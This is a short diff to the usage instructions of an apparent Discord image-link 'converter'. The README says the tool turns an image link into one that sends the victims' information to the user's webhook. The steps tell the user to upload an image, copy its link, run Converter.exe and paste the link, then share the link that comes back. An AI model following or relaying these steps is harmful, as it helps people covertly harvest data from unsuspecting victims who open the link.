@@ -5,7 +5,7 @@ __How to use__ \
 1.Upload any image to discord \
 2.Right click and copy link \
 3.Run Converter.exe \
-4.Paste the link. Ex: Link:<Image Link> \
+4.Paste the link. then copy paste the image link after the : \
   \
 Now it will return a link that you can copy paste and the victims info will be sent to that webhook \
   \
